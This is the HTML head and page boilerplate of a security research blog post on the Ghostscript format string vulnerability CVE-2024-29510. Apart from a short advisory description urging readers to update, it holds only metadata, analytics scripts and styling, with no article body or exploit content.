<!DOCTYPE html>
<html lang="en" x-data="{'anchor': '', 'anchorTitle': '', 'showAnchors': false}" class="">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta charset="utf-8"/>
    <meta http-equiv="cache-control" content="no-cache"/>

    <script>
    // We ensure to set the light mode class NOW so there is no flash of unstyled content.
    // NOTE: This is further handled by an Alpine.store
    document.documentElement.classList.toggle('light', localStorage.theme === '"light"')
    document.documentElement.classList.toggle('dark', localStorage.theme === '"dark"')

    window.Crisp = window.posthog = undefined;
    posthogToken = 'phc_P7dsURvFfgdFElAa6RGQTyZ2bdUXh4FWCU9eMmFKdn1';
crispToken = 'b2194361-69e3-4487-b89a-b13abb4866bc';
crispHidden = false;
    </script>
    	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<!-- Google tag (gtag.js) Consent Mode dataLayer added by Site Kit -->
<script type="text/javascript" id="google_gtagjs-js-consent-mode-data-layer">
/* <![CDATA[ */
window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}
gtag('consent', 'default', {"ad_personalization":"denied","ad_storage":"denied","ad_user_data":"denied","analytics_storage":"denied","functionality_storage":"denied","security_storage":"denied","personalization_storage":"denied","region":["AT","BE","BG","CH","CY","CZ","DE","DK","EE","ES","FI","FR","GB","GR","HR","HU","IE","IS","IT","LI","LT","LU","LV","MT","NL","NO","PL","PT","RO","SE","SI","SK"],"wait_for_update":500});
window._googlesitekitConsentCategoryMap = {"statistics":["analytics_storage"],"marketing":["ad_storage","ad_user_data","ad_personalization"],"functional":["functionality_storage","security_storage"],"preferences":["personalization_storage"]};
window._googlesitekitConsents = {"ad_personalization":"denied","ad_storage":"denied","ad_user_data":"denied","analytics_storage":"denied","functionality_storage":"denied","security_storage":"denied","personalization_storage":"denied","region":["AT","BE","BG","CH","CY","CZ","DE","DK","EE","ES","FI","FR","GB","GR","HR","HU","IE","IS","IT","LI","LT","LU","LV","MT","NL","NO","PL","PT","RO","SE","SI","SK"],"wait_for_update":500};
/* ]]> */
</script>
<!-- End Google tag (gtag.js) Consent Mode dataLayer added by Site Kit -->

<!-- Search Engine Optimization by Rank Math - https://rankmath.com/ -->
<title>CVE-2024-29510 - Exploiting Ghostscript using format strings &mdash; Codean Labs</title>
<meta name="description" content="A format string vulnerability in Ghostscript ≤ 10.03.0 which enables attackers to gain Remote Code Execution (#RCE) while also bypassing sandbox protections. CVE-2024-29510 has significant impact on web-applications and other services offering document conversion and preview functionalities as these often use Ghostscript under the hood. We recommend verifying whether your solution (indirectly) makes use of Ghostscript and if so, update it to the latest version!"/>
<meta name="robots" content="follow, index, max-snippet:-1, max-video-preview:-1, max-image-preview:large"/>
<link rel="canonical" href="https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="CVE-2024-29510 - Exploiting Ghostscript using format strings &mdash; Codean Labs" />
<meta property="og:description" content="A format string vulnerability in Ghostscript ≤ 10.03.0 which enables attackers to gain Remote Code Execution (#RCE) while also bypassing sandbox protections. CVE-2024-29510 has significant impact on web-applications and other services offering document conversion and preview functionalities as these often use Ghostscript under the hood. We recommend verifying whether your solution (indirectly) makes use of Ghostscript and if so, update it to the latest version!" />
<meta property="og:url" content="https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/" />
<meta property="og:site_name" content="Codean Labs" />
<meta property="article:section" content="Research" />
<meta property="og:updated_time" content="2024-10-31T16:04:20+01:00" />
<meta property="og:image" content="https://codeanlabs.com/wp-content/uploads/2024/07/gs_blog1_header.png" />
<meta property="og:image:secure_url" content="https://codeanlabs.com/wp-content/uploads/2024/07/gs_blog1_header.png" />
<meta property="og:image:width" content="954" />
<meta property="og:image:height" content="506" />
<meta property="og:image:alt" content="CVE-2024-29510" />
<meta property="og:image:type" content="image/png" />
<meta property="article:published_time" content="2024-07-02T09:50:58+02:00" />
<meta property="article:modified_time" content="2024-10-31T16:04:20+01:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="CVE-2024-29510 - Exploiting Ghostscript using format strings &mdash; Codean Labs" />
<meta name="twitter:description" content="A format string vulnerability in Ghostscript ≤ 10.03.0 which enables attackers to gain Remote Code Execution (#RCE) while also bypassing sandbox protections. CVE-2024-29510 has significant impact on web-applications and other services offering document conversion and preview functionalities as these often use Ghostscript under the hood. We recommend verifying whether your solution (indirectly) makes use of Ghostscript and if so, update it to the latest version!" />
<meta name="twitter:image" content="https://codeanlabs.com/wp-content/uploads/2024/07/gs_blog1_header.png" />
<meta name="twitter:label1" content="Written by" />
<meta name="twitter:data1" content="Thomas Rinsma" />
<meta name="twitter:label2" content="Time to read" />
<meta name="twitter:data2" content="Less than a minute" />
<script type="application/ld+json" class="rank-math-schema">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://codeanlabs.com/#organization","name":"Codean Labs","logo":{"@type":"ImageObject","@id":"https://codeanlabs.com/#logo","url":"https://codeanlabs.com/wp-content/uploads/2023/11/codeanlabs-logo-fillcolor.svg","contentUrl":"https://codeanlabs.com/wp-content/uploads/2023/11/codeanlabs-logo-fillcolor.svg","caption":"Codean Labs","inLanguage":"en-US","width":"100","height":"100"}},{"@type":"WebSite","@id":"https://codeanlabs.com/#website","url":"https://codeanlabs.com","name":"Codean Labs","publisher":{"@id":"https://codeanlabs.com/#organization"},"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://codeanlabs.com/wp-content/uploads/2024/07/gs_blog1_header.png","url":"https://codeanlabs.com/wp-content/uploads/2024/07/gs_blog1_header.png","width":"954","height":"506","inLanguage":"en-US"},{"@type":"BreadcrumbList","@id":"https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/#breadcrumb","itemListElement":[{"@type":"ListItem","position":"1","item":{"@id":"https://codeanlabs.com","name":"Home"}},{"@type":"ListItem","position":"2","item":{"@id":"https://codeanlabs.com/blog/","name":"Blog"}},{"@type":"ListItem","position":"3","item":{"@id":"https://codeanlabs.com/blog/category/research/","name":"Research"}},{"@type":"ListItem","position":"4","item":{"@id":"https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/","name":"CVE-2024-29510 &#8211; Exploiting Ghostscript using format strings"}}]},{"@type":"WebPage","@id":"https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/#webpage","url":"https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/","name":"CVE-2024-29510 - Exploiting Ghostscript using format strings &mdash; Codean Labs","datePublished":"2024-07-02T09:50:58+02:00","dateModified":"2024-10-31T16:04:20+01:00","isPartOf":{"@id":"https://codeanlabs.com/#website"},"primaryImageOfPage":{"@id":"https://codeanlabs.com/wp-content/uploads/2024/07/gs_blog1_header.png"},"inLanguage":"en-US","breadcrumb":{"@id":"https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/#breadcrumb"}},{"@type":"Person","@id":"https://codeanlabs.com/author/thomas/","name":"Thomas Rinsma","url":"https://codeanlabs.com/author/thomas/","image":{"@type":"ImageObject","@id":"https://secure.gravatar.com/avatar/81791583f829b0f248897443404c80e2?s=96&amp;d=robohash&amp;r=g","url":"https://secure.gravatar.com/avatar/81791583f829b0f248897443404c80e2?s=96&amp;d=robohash&amp;r=g","caption":"Thomas Rinsma","inLanguage":"en-US"},"worksFor":{"@id":"https://codeanlabs.com/#organization"}},{"@type":"BlogPosting","headline":"CVE-2024-29510 - Exploiting Ghostscript using format strings &mdash; Codean Labs","keywords":"CVE-2024-29510","datePublished":"2024-07-02T09:50:58+02:00","dateModified":"2024-10-31T16:04:20+01:00","articleSection":"Research","author":{"@id":"https://codeanlabs.com/author/thomas/","name":"Thomas Rinsma"},"publisher":{"@id":"https://codeanlabs.com/#organization"},"description":"A format string vulnerability in Ghostscript \u2264 10.03.0 which enables attackers to gain Remote Code Execution (#RCE) while also bypassing sandbox protections. CVE-2024-29510 has significant impact on web-applications and other services offering document conversion and preview functionalities as these often use Ghostscript under the hood. We recommend verifying whether your solution (indirectly) makes use of Ghostscript and if so, update it to the latest version!","name":"CVE-2024-29510 - Exploiting Ghostscript using format strings &mdash; Codean Labs","@id":"https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/#richSnippet","isPartOf":{"@id":"https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/#webpage"},"image":{"@id":"https://codeanlabs.com/wp-content/uploads/2024/07/gs_blog1_header.png"},"inLanguage":"en-US","mainEntityOfPage":{"@id":"https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/#webpage"}}]}</script>
<!-- /Rank Math WordPress SEO plugin -->

<link rel='dns-prefetch' href='//www.googletagmanager.com' />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/codeanlabs.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<style id='rank-math-toc-block-style-inline-css' type='text/css'>
.wp-block-rank-math-toc-block nav ol{counter-reset:item}.wp-block-rank-math-toc-block nav ol li{display:block}.wp-block-rank-math-toc-block nav ol li:before{content:counters(item, ".") ". ";counter-increment:item}

</style>
<style id='rank-math-rich-snippet-style-inline-css' type='text/css'>
/*!
* Plugin:  Rank Math
* URL: https://rankmath.com/wordpress/plugin/seo-suite/
* Name:  rank-math-review-snippet.css
*/@-webkit-keyframes spin{0%{-webkit-transform:rotate(0deg)}100%{-webkit-transform:rotate(-360deg)}}@keyframes spin{0%{-webkit-transform:rotate(0deg)}100%{-webkit-transform:rotate(-360deg)}}@keyframes bounce{from{-webkit-transform:translateY(0px);transform:translateY(0px)}to{-webkit-transform:translateY(-5px);transform:translateY(-5px)}}@-webkit-keyframes bounce{from{-webkit-transform:translateY(0px);transform:translateY(0px)}to{-webkit-transform:translateY(-5px);transform:translateY(-5px)}}@-webkit-keyframes loading{0%{background-size:20% 50% ,20% 50% ,20% 50%}20%{background-size:20% 20% ,20% 50% ,20% 50%}40%{background-size:20% 100%,20% 20% ,20% 50%}60%{background-size:20% 50% ,20% 100%,20% 20%}80%{background-size:20% 50% ,20% 50% ,20% 100%}100%{background-size:20% 50% ,20% 50% ,20% 50%}}@keyframes loading{0%{background-size:20% 50% ,20% 50% ,20% 50%}20%{background-size:20% 20% ,20% 50% ,20% 50%}40%{background-size:20% 100%,20% 20% ,20% 50%}60%{background-size:20% 50% ,20% 100%,20% 20%}80%{background-size:20% 50% ,20% 50% ,20% 100%}100%{background-size:20% 50% ,20% 50% ,20% 50%}}:root{--rankmath-wp-adminbar-height: 0}#rank-math-rich-snippet-wrapper{overflow:hidden}#rank-math-rich-snippet-wrapper h5.rank-math-title{display:block;font-size:18px;line-height:1.4}#rank-math-rich-snippet-wrapper .rank-math-review-image{float:right;max-width:40%;margin-left:15px}#rank-math-rich-snippet-wrapper .rank-math-review-data{margin-bottom:15px}#rank-math-rich-snippet-wrapper .rank-math-total-wrapper{width:100%;padding:0 0 20px 0;float:left;clear:both;position:relative;-webkit-box-sizing:border-box;box-sizing:border-box}#rank-math-rich-snippet-wrapper .rank-math-total-wrapper .rank-math-total{border:0;display:block;margin:0;width:auto;float:left;text-align:left;padding:0;font-size:24px;line-height:1;font-weight:700;-webkit-box-sizing:border-box;box-sizing:border-box;overflow:hidden}#rank-math-rich-snippet-wrapper .rank-math-total-wrapper .rank-math-review-star{float:left;margin-left:15px;margin-top:5px;position:relative;z-index:99;line-height:1}#rank-math-rich-snippet-wrapper .rank-math-total-wrapper .rank-math-review-star .rank-math-review-result-wrapper{display:inline-block;white-space:nowrap;position:relative;color:#e7e7e7}#rank-math-rich-snippet-wrapper .rank-math-total-wrapper .rank-math-review-star .rank-math-review-result-wrapper .rank-math-review-result{position:absolute;top:0;left:0;overflow:hidden;white-space:nowrap;color:#ffbe01}#rank-math-rich-snippet-wrapper .rank-math-total-wrapper .rank-math-review-star .rank-math-review-result-wrapper i{font-size:18px;-webkit-text-stroke-width:1px;font-style:normal;padding:0 2px;line-height:inherit}#rank-math-rich-snippet-wrapper .rank-math-total-wrapper .rank-math-review-star .rank-math-review-result-wrapper i:before{content:"\2605"}body.rtl #rank-math-rich-snippet-wrapper .rank-math-review-image{float:left;margin-left:0;margin-right:15px}body.rtl #rank-math-rich-snippet-wrapper .rank-math-total-wrapper .rank-math-total{float:right}body.rtl #rank-math-rich-snippet-wrapper .rank-math-total-wrapper .rank-math-review-star{float:right;margin-left:0;margin-right:15px}body.rtl #rank-math-rich-snippet-wrapper .rank-math-total-wrapper .rank-math-review-star .rank-math-review-result{left:auto;right:0}@media screen and (max-width: 480px){#rank-math-rich-snippet-wrapper .rank-math-review-image{display:block;max-width:100%;width:100%;text-align:center;margin-right:0}#rank-math-rich-snippet-wrapper .rank-math-review-data{clear:both}}.clear{clear:both}

</style>
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='main-css' href='https://codeanlabs.com/wp-content/themes/codean/dist/main-DCgcUpso.css?ver=6.7.1' type='text/css' media='all' />
<script type="module" src="https://codeanlabs.com/wp-content/themes/codean/dist/ph-_vs3IGmY.js?ver=6.7.1" id="src/ph.ts-js"></script>
<script type="module" src="https://codeanlabs.com/wp-content/themes/codean/dist/crisp-DzCIRo_r.js?ver=6.7.1" id="src/crisp.ts-js"></script>

<!-- Google tag (gtag.js) snippet added by Site Kit -->

<!-- Google Analytics snippet added by Site Kit -->
<script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=GT-K8D5DF7W" id="google_gtagjs-js" async></script>
<script type="text/javascript" id="google_gtagjs-js-after">
/* <![CDATA[ */
window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}
gtag("set","linker",{"domains":["codeanlabs.com"]});
gtag("js", new Date());
gtag("set", "developer_id.dZTNiMT", true);
gtag("config", "GT-K8D5DF7W");
/* ]]> */
</script>

<!-- End Google tag (gtag.js) snippet added by Site Kit -->
<link rel="https://api.w.org/" href="https://codeanlabs.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://codeanlabs.com/wp-json/wp/v2/posts/1415" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://codeanlabs.com/xmlrpc.php?rsd" />

<link rel='shortlink' href='https://codeanlabs.com/?p=1415' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://codeanlabs.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcodeanlabs.com%2Fblog%2Fresearch%2Fcve-2024-29510-ghostscript-format-string-exploitation%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://codeanlabs.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcodeanlabs.com%2Fblog%2Fresearch%2Fcve-2024-29510-ghostscript-format-string-exploitation%2F&#038;format=xml" />
<meta name="generator" content="Site Kit by Google 1.141.0" />
<!-- Google Tag Manager snippet added by Site Kit -->
<script type="text/javascript">
/* <![CDATA[ */

			( function( w, d, s, l, i ) {
				w[l] = w[l] || [];
				w[l].push( {'gtm.start': new Date().getTime(), event: 'gtm.js'} );
				var f = d.getElementsByTagName( s )[0],
					j = d.createElement( s ), dl = l != 'dataLayer' ? '&l=' + l : '';
				j.async = true;
				j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
				f.parentNode.insertBefore( j, f );
			} )( window, document, 'script', 'dataLayer', 'GTM-TJNDGM5W' );
			
/* ]]> */
</script>

<!-- End Google Tag Manager snippet added by Site Kit -->
<link rel="icon" href="https://codeanlabs.com/wp-content/uploads/2023/11/favicon-512.svg" sizes="32x32" />
<link rel="icon" href="https://codeanlabs.com/wp-content/uploads/2023/11/favicon-512.svg" sizes="192x192" />
<link rel="apple-touch-icon" href="https://codeanlabs.com/wp-content/uploads/2023/11/favicon-512.svg" />
<meta name="msapplication-TileImage" content="https://codeanlabs.com/wp-content/uploads/2023/11/favicon-512.svg" />
</head>
<body class="post-template-default single single-post postid-1415 single-format-standard has-[dialog:is([open])]:overflow-y-hidden">
    <dialog id="popup" class="open:flex open:flex-col open:fixed size-[unset] max-w-[unset] max-h-[unset] inset-0 lg:inset-16 lg:rounded-lg backdrop:bg-black/10 backdrop:backdrop-blur-sm bg-white" >
        <button class="fixed right-5 lg:right-16 top-5 button button-primary lg:button-secondary space-x-2" onclick="document.querySelector('#popup').close();">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
